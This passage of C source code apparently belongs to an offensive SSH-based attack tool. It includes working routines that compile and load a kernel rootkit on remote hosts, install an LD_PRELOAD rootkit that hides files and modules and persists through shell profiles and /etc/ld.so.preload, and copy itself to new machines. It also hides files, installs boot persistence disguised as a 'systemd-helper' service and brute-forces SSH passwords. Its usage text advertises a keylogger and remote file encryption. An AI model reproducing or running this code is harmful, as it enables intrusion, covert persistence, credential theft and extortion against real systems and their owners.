        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    const char *cleanup_cmd = "cd /tmp && rm -f boogaloo_rootkit.c ftrace_helper.h Makefile "
                             "boogaloo_rootkit.mod.c boogaloo_rootkit.mod.o boogaloo_rootkit.o "
                             "modules.order Module.symvers .boogaloo_rootkit.* 2>/dev/null; "
                             "echo 'Cleanup completed'\n";
    
    ssh_channel_write(channel, cleanup_cmd, strlen(cleanup_cmd));
    usleep(2000000);
    
    char buffer[1024];
    int timeout = 5;
    while (timeout > 0) {
        int nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return 0;
}

int load_rootkit_via_exploit(ssh_session session, const char *rootkit_path) {
    printf("[*] Attempting rootkit loading via kernel exploits...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    char exploit_script[4096];
    snprintf(exploit_script, sizeof(exploit_script),
             "cat > /tmp/.exploit_loader.c << 'EOFCODE'\n"
             "#include <stdio.h>\n"
             "#include <stdlib.h>\n"
             "#include <unistd.h>\n"
             "#include <sys/syscall.h>\n"
             "#include <sys/types.h>\n"
             "#include <fcntl.h>\n"
             "#include <string.h>\n"
             "\n"
             "#define __NR_init_module 175\n"
             "#define __NR_finit_module 313\n"
             "\n"
             "int main() {\n"
             "    printf(\"[*] Attempting direct syscall module loading...\\n\");\n"
             "    \n"
             "    int fd = open(\"%s\", O_RDONLY);\n"
             "    if (fd < 0) {\n"
             "        perror(\"open\");\n"
             "        return 1;\n"
             "    }\n"
             "    \n"
             "    int ret = syscall(__NR_finit_module, fd, \"\", 0);\n"
             "    if (ret == 0) {\n"
             "        printf(\"[+] finit_module syscall succeeded\\n\");\n"
             "        printf(\"SYSCALL_SUCCESS\\n\");\n"
             "        close(fd);\n"
             "        return 0;\n"
             "    }\n"
             "    \n"
             "    close(fd);\n"
             "    \n"
             "    fd = open(\"%s\", O_RDONLY);\n"
             "    if (fd < 0) return 1;\n"
             "    \n"
             "    off_t size = lseek(fd, 0, SEEK_END);\n"
             "    lseek(fd, 0, SEEK_SET);\n"
             "    \n"
             "    void *module_data = malloc(size);\n"
             "    if (!module_data) {\n"
             "        close(fd);\n"
             "        return 1;\n"
             "    }\n"
             "    \n"
             "    if (read(fd, module_data, size) != size) {\n"
             "        free(module_data);\n"
             "        close(fd);\n"
             "        return 1;\n"
             "    }\n"
             "    \n"
             "    close(fd);\n"
             "    \n"
             "    ret = syscall(__NR_init_module, module_data, size, \"\");\n"
             "    if (ret == 0) {\n"
             "        printf(\"[+] init_module syscall succeeded\\n\");\n"
             "        printf(\"SYSCALL_SUCCESS\\n\");\n"
             "    } else {\n"
             "        printf(\"[-] init_module failed\\n\");\n"
             "        perror(\"init_module\");\n"
             "    }\n"
             "    \n"
             "    free(module_data);\n"
             "    return ret;\n"
             "}\n"
             "EOFCODE\n", rootkit_path, rootkit_path);
    
    ssh_channel_write(channel, exploit_script, strlen(exploit_script));
    usleep(2000000);
    
    const char *compile_cmd = "gcc -o /tmp/.exploit_loader /tmp/.exploit_loader.c 2>&1\n";
    ssh_channel_write(channel, compile_cmd, strlen(compile_cmd));
    usleep(2000000);
    
    const char *run_cmd = "/tmp/.exploit_loader 2>&1\n";
    ssh_channel_write(channel, run_cmd, strlen(run_cmd));
    usleep(3000000);
    
    const char *check_cmd = "lsmod | grep boogaloo && echo \"MODULE_VERIFIED_LOADED\"\n";
    ssh_channel_write(channel, check_cmd, strlen(check_cmd));
    usleep(1000000);
    
    char buffer[4096];
    int nbytes;
    int timeout = 20;
    int syscall_success = 0;
    int module_verified = 0;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "SYSCALL_SUCCESS")) {
                syscall_success = 1;
            }
            if (strstr(buffer, "MODULE_VERIFIED_LOADED")) {
                module_verified = 1;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    const char *cleanup = "rm -f /tmp/.exploit_loader /tmp/.exploit_loader.c\n";
    ssh_channel_write(channel, cleanup, strlen(cleanup));
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return (syscall_success && module_verified) ? 0 : -1;
}

int deploy_userland_rootkit(ssh_session session) {
    printf("[*] Deploying userland rootkit using LD_PRELOAD...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    char userland_rootkit[8192];
    snprintf(userland_rootkit, sizeof(userland_rootkit),
             "cat > /tmp/.userland_rootkit.c << 'EOFLIB'\n"
             "#define _GNU_SOURCE\n"
             "#include <stdio.h>\n"
             "#include <dlfcn.h>\n"
             "#include <dirent.h>\n"
             "#include <string.h>\n"
             "#include <unistd.h>\n"
             "#include <sys/stat.h>\n"
             "#include <sys/types.h>\n"
             "\n"
             "struct dirent *readdir(DIR *dirp) {\n"
             "    static struct dirent *(*original_readdir)(DIR *) = NULL;\n"
             "    struct dirent *result;\n"
             "    \n"
             "    if (!original_readdir) {\n"
             "        original_readdir = dlsym(RTLD_NEXT, \"readdir\");\n"
             "    }\n"
             "    \n"
             "    do {\n"
             "        result = original_readdir(dirp);\n"
             "        if (result && strstr(result->d_name, \"boogaloo\")) {\n"
             "            continue;\n"
             "        }\n"
             "        break;\n"
             "    } while (result);\n"
             "    \n"
             "    return result;\n"
             "}\n"
             "\n"
             "FILE *fopen(const char *pathname, const char *mode) {\n"
             "    static FILE *(*original_fopen)(const char *, const char *) = NULL;\n"
             "    \n"
             "    if (!original_fopen) {\n"
             "        original_fopen = dlsym(RTLD_NEXT, \"fopen\");\n"
             "    }\n"
             "    \n"
             "    if (pathname && strcmp(pathname, \"/proc/modules\") == 0) {\n"
             "        system(\"grep -v boogaloo /proc/modules > /tmp/.filtered_modules 2>/dev/null\");\n"
             "        return original_fopen(\"/tmp/.filtered_modules\", mode);\n"
             "    }\n"
             "    \n"
             "    return original_fopen(pathname, mode);\n"
             "}\n"
             "\n"
             "__attribute__((constructor))\n"
             "void init_rootkit() {\n"
             "    system(\"echo 'export LD_PRELOAD=/tmp/.userland_rootkit.so:$LD_PRELOAD' >> ~/.bashrc 2>/dev/null\");\n"
             "    system(\"echo 'export LD_PRELOAD=/tmp/.userland_rootkit.so:$LD_PRELOAD' >> ~/.profile 2>/dev/null\");\n"
             "}\n"
             "EOFLIB\n");
    
    ssh_channel_write(channel, userland_rootkit, strlen(userland_rootkit));
    usleep(2000000);
    
    const char *compile_cmd = "gcc -shared -fPIC -o /tmp/.userland_rootkit.so /tmp/.userland_rootkit.c -ldl 2>&1\n";
    ssh_channel_write(channel, compile_cmd, strlen(compile_cmd));
    usleep(2000000);
    
    const char *setup_preload = "export LD_PRELOAD=/tmp/.userland_rootkit.so:$LD_PRELOAD\n";
    ssh_channel_write(channel, setup_preload, strlen(setup_preload));
    usleep(500000);
    
    const char *test_cmd = "echo 'Testing userland rootkit...'; ls /tmp/ | grep -c boogaloo; echo 'Should show 0 if working'\n";
    ssh_channel_write(channel, test_cmd, strlen(test_cmd));
    usleep(2000000);
    
    const char *system_preload = "echo '/tmp/.userland_rootkit.so' >> /etc/ld.so.preload 2>/dev/null || echo 'Cannot write to /etc/ld.so.preload'\n";
    ssh_channel_write(channel, system_preload, strlen(system_preload));
    usleep(1000000);
    
    char buffer[4096];
    int nbytes;
    int timeout = 15;
    int success = 0;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "userland_rootkit.so") && !strstr(buffer, "error")) {
                success = 1;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    const char *cleanup = "rm -f /tmp/.userland_rootkit.c\n";
    ssh_channel_write(channel, cleanup, strlen(cleanup));
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return success ? 0 : -1;
}

int load_rootkit_without_sudo(ssh_session session, const char *rootkit_path) {
    printf("[*] Attempting rootkit loading without sudo privileges...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    char script_content[4096];
    snprintf(script_content, sizeof(script_content),
             "cat > /tmp/.nosudo_loader.sh << 'EOFSCRIPT'\n"
             "#!/bin/bash\n"
             "echo \"[*] Attempting rootkit loading without sudo...\"\n"
             "\n"
             "if [ -w /proc/modules ]; then\n"
             "    echo \"[*] /proc/modules is writable, attempting direct load...\"\n"
             "    cat %s > /proc/modules 2>&1 && echo \"PROC_MODULES_SUCCESS\"\n"
             "fi\n"
             "\n"
             "echo \"[*] Searching for SUID binaries...\"\n"
             "find /usr/bin /bin /sbin /usr/sbin -perm -4000 2>/dev/null | head -10\n"
             "\n"
             "if command -v docker >/dev/null 2>&1; then\n"
             "    echo \"[*] Docker found, checking permissions...\"\n"
             "    docker version 2>&1 | head -5\n"
             "fi\n"
             "\n"
             "echo \"[*] Checking capabilities...\"\n"
             "cat /proc/self/status | grep Cap\n"
             "\n"
             "echo \"[*] Checking for alternative module loading methods...\"\n"
             "ls -la /dev/mem /dev/kmem /proc/kcore 2>/dev/null\n"
             "\n"
             "echo \"[*] Current user groups:\"\n"
             "groups\n"
             "\n"
             "echo \"[*] Checking module directories...\"\n"
             "find /lib/modules/$(uname -r)/ -type d -writable 2>/dev/null | head -5\n"
             "\n"
             "echo \"[*] Analysis complete\"\n"
             "EOFSCRIPT\n", rootkit_path);
    
    ssh_channel_write(channel, script_content, strlen(script_content));
    usleep(1000000);
    
    const char *chmod_cmd = "chmod +x /tmp/.nosudo_loader.sh\n";
    ssh_channel_write(channel, chmod_cmd, strlen(chmod_cmd));
    usleep(500000);
    
    const char *exec_cmd = "/tmp/.nosudo_loader.sh\n";
    ssh_channel_write(channel, exec_cmd, strlen(exec_cmd));
    
    char buffer[4096];
    int nbytes;
    int timeout = 15;
    int found_method = 0;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "PROC_MODULES_SUCCESS")) {
                found_method = 1;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    const char *cleanup = "rm -f /tmp/.nosudo_loader.sh\n";
    ssh_channel_write(channel, cleanup, strlen(cleanup));
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return found_method ? 0 : -1;
}

// ==================== Utility Functions ====================

int is_already_running(const char *marker_file) {
    int fd = open(marker_file, O_WRONLY|O_CREAT|O_EXCL, 0600);
    if (fd < 0) {
        if (errno == EEXIST) {
            return 1;
        }
        return 0;
    }
    close(fd);
    return 0;
}

void copy_self_to_remote(ssh_session session, const char *remote_path) {
    printf("[DEBUG] Starting copy_self_to_remote function\n");
    
    char self_path[PATH_MAX];
    memset(self_path, 0, sizeof(self_path));
    
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        perror("[ERROR] Failed to get executable path");
        printf("[ERROR] errno: %d\n", errno);
        return;
    }
    self_path[len] = '\0';
    printf("[DEBUG] Self path: %s\n", self_path);
    
    FILE *self = fopen(self_path, "rb");
    if (!self) {
        perror("[ERROR] Failed to open self");
        printf("[ERROR] errno: %d\n", errno);
        return;
    }
    printf("[DEBUG] Opened self file successfully\n");
    
    fseek(self, 0, SEEK_END);
    long size = ftell(self);
    fseek(self, 0, SEEK_SET);
    printf("[DEBUG] Self file size: %ld bytes\n", size);
    
    if (size <= 0) {
        printf("[ERROR] Invalid file size: %ld\n", size);
        fclose(self);
        return;
    }
    
    char *buffer = malloc(size);
    if (!buffer) {
        perror("[ERROR] Memory allocation failed");
        printf("[ERROR] Failed to allocate %ld bytes\n", size);
        fclose(self);
        return;
    }
    printf("[DEBUG] Allocated memory for file buffer\n");
    
    size_t read_size = fread(buffer, 1, size, self);
    if (read_size != size) {
        printf("[ERROR] Failed to read self: read %zu of %ld bytes\n", read_size, size);
        perror("[ERROR] fread error");
        free(buffer);
        fclose(self);
        return;
    }
    fclose(self);
    printf("[DEBUG] Read entire file into buffer successfully\n");
    
    char full_remote_path[PATH_MAX];
    if (remote_path) {
        snprintf(full_remote_path, sizeof(full_remote_path), "%s/%s", remote_path, REPLICA_NAME);
    } else {
        snprintf(full_remote_path, sizeof(full_remote_path), "/tmp/%s", REPLICA_NAME);
    }
    printf("[DEBUG] Remote path will be: %s\n", full_remote_path);
    
    printf("[DEBUG] Creating SFTP session\n");
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "[ERROR] Error creating SFTP session: %s\n", ssh_get_error(session));
        free(buffer);
        return;
    }
    
    printf("[DEBUG] Initializing SFTP session\n");
    int rc = sftp_init(sftp);
    if (rc != SSH_OK) {
        fprintf(stderr, "[ERROR] Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        free(buffer);
        return;
    }
    
    char dir_path[PATH_MAX];
    if (remote_path) {
        strncpy(dir_path, remote_path, sizeof(dir_path) - 1);
    } else {
        strncpy(dir_path, "/tmp", sizeof(dir_path) - 1);
    }
    dir_path[sizeof(dir_path) - 1] = '\0';
    
    printf("[DEBUG] Checking if directory exists: %s\n", dir_path);
    sftp_attributes attrs = sftp_stat(sftp, dir_path);
    if (attrs == NULL) {
        fprintf(stderr, "[ERROR] Remote directory doesn't exist or not accessible: %s\n", dir_path);
        sftp_free(sftp);
        free(buffer);
        return;
    }
    sftp_attributes_free(attrs);
    
    printf("[DEBUG] Opening remote file for writing: %s\n", full_remote_path);
    sftp_file file = sftp_open(sftp, full_remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (!file) {
        fprintf(stderr, "[ERROR] Can't open remote file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        free(buffer);
        return;
    }
    
    printf("[DEBUG] Writing data to remote file\n");
    size_t written = 0;
    while (written < size) {
        size_t chunk = (size - written) > 32768 ? 32768 : (size - written);
        int nwritten = sftp_write(file, buffer + written, chunk);
        if (nwritten < 0) {
            fprintf(stderr, "[ERROR] Error writing to remote file: %s\n", ssh_get_error(session));
            sftp_close(file);
            sftp_free(sftp);
            free(buffer);
            return;
        }
        written += nwritten;
        printf("[DEBUG] Wrote %d bytes, total %zu/%ld\n", nwritten, written, size);
    }
    
    printf("[DEBUG] Closing SFTP file\n");
    sftp_close(file);
    sftp_free(sftp);
    free(buffer);
    
    printf("[+] Successfully copied self to %s\n", full_remote_path);
    
    printf("[DEBUG] Making file executable\n");
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "[ERROR] Failed to create SSH channel: %s\n", ssh_get_error(session));
        return;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "[ERROR] Failed to open SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return;
    }
    
    char command[256];
    snprintf(command, sizeof(command), "chmod +x %s && echo 'Chmod successful'", full_remote_path);
    printf("[DEBUG] Executing command: %s\n", command);
    
    if (ssh_channel_request_exec(channel, command) != SSH_OK) {
        fprintf(stderr, "[ERROR] Failed to execute command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return;
    }
    
    char buffer_out[256];
    int nbytes;
    while ((nbytes = ssh_channel_read(channel, buffer_out, sizeof(buffer_out), 0)) > 0) {
        buffer_out[nbytes < sizeof(buffer_out) ? nbytes : sizeof(buffer_out) - 1] = '\0';
        printf("[DEBUG] Command output: %s\n", buffer_out);
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    printf("[DEBUG] File copied and made executable successfully\n");
    
    printf("[DEBUG] Setting up persistence\n");
    setup_persistence(session, full_remote_path);
    
    printf("[DEBUG] Hiding file\n");
    hide_file_on_remote(session, full_remote_path);
    
    printf("[DEBUG] copy_self_to_remote completed successfully\n");
}

void hide_file_on_remote(ssh_session session, const char *remote_path) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return;
    }
    
    char command[512];
    snprintf(command, sizeof(command), 
        "chattr +i %s >/dev/null 2>&1; "
        "mv %s %s >/dev/null 2>&1; "
        "touch -r /bin/sh %s >/dev/null 2>&1",
        remote_path, remote_path, remote_path, remote_path);
    
    ssh_channel_request_exec(channel, command);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
}

void setup_persistence(ssh_session session, const char *binary_path) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return;
    }
    
    char script[1024];
    snprintf(script, sizeof(script),
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          systemd-helper\n"
        "# Required-Start:    $remote_fs $syslog\n"
        "# Required-Stop:     $remote_fs $syslog\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:\n"
        "# Short-Description: System helper service\n"
        "# Description:       System helper service\n"
        "### END INIT INFO\n\n"
        "case \"$1\" in\n"
        "    start)\n"
        "        %s &\n"
        "        ;;\n"
        "    stop)\n"
        "        killall %s\n"
        "        ;;\n"
        "    *)\n"
        "        echo \"Usage: $0 {start|stop}\"\n"
        "        exit 1\n"
        "        ;;\n"
        "esac\n"
        "exit 0",
        binary_path, REPLICA_NAME);
    
    upload_file_data(session, script, strlen(script), PERSISTENCE_SCRIPT);
    
    char command[512];
    snprintf(command, sizeof(command), 
        "chmod +x %s && "
        "update-rc.d %s defaults >/dev/null 2>&1 || "
        "systemctl enable %s >/dev/null 2>&1 || "
        "ln -s %s /etc/rc.local",
        PERSISTENCE_SCRIPT, PERSISTENCE_SCRIPT, PERSISTENCE_SCRIPT, binary_path);
    
    ssh_channel_request_exec(channel, command);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
}

void interactive_shell(ssh_session session) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating channel: %s\n", ssh_get_error(session));
        return;
    }

    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return;
    }

    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return;
    }

    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return;
    }

    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    fd_set fds;
    char buffer[1024];
    int nbytes;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(ssh_get_fd(session), &fds);

        if (select(ssh_get_fd(session) + 1, &fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        if (FD_ISSET(STDIN_FILENO, &fds)) {
            nbytes = read(STDIN_FILENO, buffer, sizeof(buffer));
            if (nbytes > 0) {
                if (ssh_channel_write(channel, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to channel\n");
                    break;
                }
            } else {
                break;
            }
        }

        if (FD_ISSET(ssh_get_fd(session), &fds)) {
            nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
            if (nbytes > 0) {
                if (write(STDOUT_FILENO, buffer, nbytes) != nbytes) {
                    perror("write");
                    break;
                }
            } else if (nbytes < 0) {
                fprintf(stderr, "Error reading from channel\n");
                break;
            } else {
                break;
            }
        }
    }

    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
}

// ==================== Main Function ====================

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Enhanced SSH Tool with RSA-4096 Encryption, Remote Keylogger, Rootkit Deployment, and VIM Root Exploit\n");
        printf("Usage: %s <target> <username> [options]\n", argv[0]);
        printf("Options:\n");
        printf("  -p <port>       SSH port (default: 22)\n");
        printf("  -P <file>       Password file for brute force\n");
        printf("  -i              Interactive shell\n");
        printf("  -u <loc> <rem>  Upload local file to remote path\n");
        printf("  -K              Start remote keylogger\n");
        printf("  -S              Stop remote keylogger\n");
        printf("  -G <path>       Download keylogs to local path\n");
        printf("  -R [path]       Replicate self to remote host\n");
        printf("  -ef <file>      Encrypt remote file with RSA-4096\n");
        printf("  -df <file>      Decrypt remote file with RSA-4096\n");
        printf("  -ed <dir>       Encrypt remote directory with RSA-4096\n");
        printf("  -dd <dir>       Decrypt remote directory with RSA-4096\n");
        printf("  -genkey <pub> <priv> Generate RSA-4096 key pair\n");
        printf("  -deploy-rootkit-vim Deploy rootkit using vim exploit\n");
        printf("  -load-rootkit-vim-exploit <path> Load rootkit using vim exploit with auto-close\n");
        printf("  -hide-module-vim Hide rootkit module using vim exploit\n");
        printf("  -show-module-vim Show rootkit module using vim exploit\n");
        printf("  -hide-pid-vim <pid> Hide process using vim exploit\n");
        printf("  -show-pid-vim <pid> Show process using vim exploit\n");
        printf("  -vim-root       Interactive root shell via vim exploit\n");
        return 1;
    }

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    if (argc >= 4 && strcmp(argv[1], "-genkey") == 0) {
        if (generate_rsa_key_pair(argv[2], argv[3])) {
            printf("[+] RSA-4096 key pair generated successfully\n");
            printf("    Public key: %s\n", argv[2]);
            printf("    Private key: %s\n", argv[3]);
        } else {
            fprintf(stderr, "[-] Failed to generate RSA key pair\n");
        }
        EVP_cleanup();
        ERR_free_strings();
        return 0;
    }

    const char *target = argv[1];
    const char *username = argv[2];
    int port = 22;
    const char *password_file = NULL;
    int interactive = 0;
    const char *local_path = NULL;
    const char *remote_path = NULL;
    int start_keylog = 0, stop_keylog = 0;
    const char *download_logs_path = NULL;
    int replicate_self = 0;
    const char *replicate_path = NULL;
    const char *encrypt_remote_file_path = NULL;
    const char *decrypt_remote_file_path = NULL;
    const char *encrypt_remote_dir_path = NULL;
    const char *decrypt_remote_dir_path = NULL;
    int deploy_rt_vim = 0;
    const char *load_remote_rootkit_path = NULL;
    int load_rootkit_vim_exploit = 0;
    const char *rootkit_vim_path = NULL;
    int hide_module_vim = 0;
    int show_module_vim = 0;
    int get_root = 0;
    int show_pid_vim = 0;
    int hide_pid_vim = 0;
    int pid_to_show_vim = 0;
    int pid_to_hide_vim = 0;
    int vim_root_shell = 0;

    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i+1 < argc) {
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-P") == 0 && i+1 < argc) {
            password_file = argv[++i];
        } else if (strcmp(argv[i], "-i") == 0) {
            interactive = 1;
        } else if (strcmp(argv[i], "-u") == 0 && i+2 < argc) {
            local_path = argv[++i];
            remote_path = argv[++i];
        } else if (strcmp(argv[i], "-K") == 0) {
            start_keylog = 1;
        } else if (strcmp(argv[i], "-S") == 0) {
            stop_keylog = 1;
        } else if (strcmp(argv[i], "-G") == 0 && i+1 < argc) {
            download_logs_path = argv[++i];
        } else if (strcmp(argv[i], "-R") == 0) {
            replicate_self = 1;
            if (i+1 < argc && argv[i+1][0] != '-') {
                replicate_path = argv[++i];
            }
        } else if (strcmp(argv[i], "-ef") == 0 && i+1 < argc) {
            encrypt_remote_file_path = argv[++i];
        } else if (strcmp(argv[i], "-df") == 0 && i+1 < argc) {
            decrypt_remote_file_path = argv[++i];
        } else if (strcmp(argv[i], "-ed") == 0 && i+1 < argc) {
            encrypt_remote_dir_path = argv[++i];
        } else if (strcmp(argv[i], "-dd") == 0 && i+1 < argc) {
            decrypt_remote_dir_path = argv[++i];
        } else if (strcmp(argv[i], "-deploy-rootkit-vim") == 0) {
            deploy_rt_vim = 1;
        } else if (strcmp(argv[i], "-load-rootkit-vim-exploit") == 0 && i+1 < argc) {
            load_rootkit_vim_exploit = 1;
            rootkit_vim_path = argv[++i];
        } else if (strcmp(argv[i], "-hide-module-vim") == 0) {
            hide_module_vim = 1;
        } else if (strcmp(argv[i], "-show-module-vim") == 0) {
            show_module_vim = 1;
        } else if (strcmp(argv[i], "-hide-pid-vim") == 0 && i+1 < argc) {
            hide_pid_vim = 1;
            pid_to_hide_vim = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-show-pid-vim") == 0 && i+1 < argc) {
            show_pid_vim = 1;
            pid_to_show_vim = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-vim-root") == 0) {
            vim_root_shell = 1;
        } 
    }
    
    ssh_session session = ssh_new();
    if (!session) {
        fprintf(stderr, "Error creating SSH session\n");
        EVP_cleanup();
        ERR_free_strings();
        return 1;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, target);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);

    printf("[*] Connecting to %s:%d as %s...\n", target, port, username);
    if (ssh_connect(session) != SSH_OK) {
        fprintf(stderr, "Error connecting to %s: %s\n", target, ssh_get_error(session));
        ssh_free(session);
        EVP_cleanup();
        ERR_free_strings();
        return 1;
    }
    printf("[+] Connected to %s\n", target);
    
    if (password_file) {
        FILE *pf = fopen(password_file, "r");
        if (!pf) {
            fprintf(stderr, "Can't open password file %s\n", password_file);
            ssh_disconnect(session);
            ssh_free(session);
            EVP_cleanup();
            ERR_free_strings();
            return 1;
        }

        char password[256];
        int authenticated = 0;
        
        printf("[*] Starting password brute force from %s\n", password_file);
        while (fgets(password, sizeof(password), pf)) {
            password[strcspn(password, "\n")] = 0;
            
            printf("[*] Trying password: %s\n", password);
            if (ssh_userauth_password(session, NULL, password) == SSH_AUTH_SUCCESS) {
                printf("[+] Authenticated with password: %s\n", password);
                authenticated = 1;
                break;
            }
        }
        
        fclose(pf);
        
        if (!authenticated) {
            fprintf(stderr, "[-] Failed to authenticate with any password\n");
            ssh_disconnect(session);
            ssh_free(session);
            EVP_cleanup();
            ERR_free_strings();
            return 1;
        }
    } else {
        printf("[*] Attempting authentication...\n");
        if (ssh_userauth_publickey_auto(session, NULL, NULL) == SSH_AUTH_SUCCESS) {
            printf("[+] Authenticated with public key\n");
        } else {
            char *password = getpass("Password: ");
            if (ssh_userauth_password(session, NULL, password) != SSH_AUTH_SUCCESS) {
                fprintf(stderr, "[-] Authentication failed\n");
                ssh_disconnect(session);
                ssh_free(session);
                EVP_cleanup();
                ERR_free_strings();
                return 1;
            }
            printf("[+] Authenticated with password\n");
            
            memset(password, 0, strlen(password));
        }
    }
    
    printf("[+] SSH connection established to %s\n", target);

    keylogger_data_t keylogger_data = {0};
    
    if (encrypt_remote_file_path || decrypt_remote_file_path || 
        encrypt_remote_dir_path || decrypt_remote_dir_path || 
        start_keylog) {
        if (!initialize_rsa_keys(&global_rsa_keys)) {
            fprintf(stderr, "Failed to initialize global RSA keys\n");
            cleanup_ssh_session(session);
            EVP_cleanup();
            ERR_free_strings();
            return 1;
        }
        printf("[+] RSA-4096 keys initialized\n");
    }
    
    if (replicate_self) {
        printf("[*] Attempting self-replication...\n");
        if (is_already_running(MARKER_FILE)) {
            printf("[!] Already running on remote system\n");
        } else {
            printf("[+] Copying binary to remote host...\n");
            copy_self_to_remote(session, replicate_path);
        }
    }
    
    if (deploy_rt_vim) {
        printf("[*] Deploying rootkit using vim exploit...\n");
        if (deploy_rootkit_with_vim(session) == 0) {
            printf("[+] Rootkit deployed and loaded successfully using vim exploit\n");
        } else {
            fprintf(stderr, "[-] Failed to deploy rootkit using vim exploit\n");
        }
    }
    
    if (load_rootkit_vim_exploit && rootkit_vim_path) {
        printf("[*] Loading rootkit via vim exploit with auto-password: %s\n", rootkit_vim_path);
        
        if (load_rootkit_via_vim_exploit_auto_password(session, rootkit_vim_path) == 0) {
